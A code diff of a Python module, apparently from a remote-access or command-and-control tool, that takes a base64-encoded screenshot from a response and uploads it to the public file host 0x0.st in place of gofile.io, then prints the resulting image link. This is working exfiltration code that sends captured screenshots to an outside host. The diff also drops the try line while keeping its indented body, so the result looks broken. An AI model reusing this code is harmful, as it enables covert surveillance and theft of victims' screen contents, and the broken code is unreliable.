@@ -40,33 +40,25 @@ class Module(ModuleABC):
 
     
     def process_response(self, response, response_options):
-        try:
             output_name = "{}.png".format(response_options["output_name"])
-            data = b64decode(response.decode().split("'")[1].encode())
-            url = 'https://cold7.gofile.io/contents/uploadfile'
+            data_res = b64decode(response.decode().split("'")[1].encode())
+            url = 'https://0x0.st'
             data = {
-                "file": (output_name,response),
+                "file": (output_name,data_res),
                 }
-            r = requests.post(url,data=data)
-            jsonres = json.loads(r.json())
-            status = jsonres['status']
-            if status == "ok":
-                fileId = jsonres['fileId']
-                filename = jsonres['fileName']
-                downloadpage = jsonres['downloadPage']
-                directImage = f"https://cold7.gofile.io/download/web/{fileId}/{filename}"
+            print("Sending Request","\n"*5)
+            r = requests.post(url,files=data)
+            print(f"Request Sent\n{r.content}","\n"*5)
+            url = r.text.strip()
+            if r.status_code == 200:
                 res = ""
-                res = f"Direct Image Url:~ {directImage}"
-                res += f"Download Page:~ {downloadpage}"
-                res += f"File Id :~ {fileId}"
-                res += f"Filename:~ {filename}\n\n"
-                res += response.decode() +"\n\n\n\n\n"
-                res += "----------"*20+"\n\n"
+                res = f"Your Image Url of Screenshot:~ {str(url)}\n"
+                res += "\n\n"
+                res += "----------"*20+"\n\n\n\n"
                 return res
             else:
                 return r.content
-        except Exception as e:
-            return str(e)
+        
         
 
 """
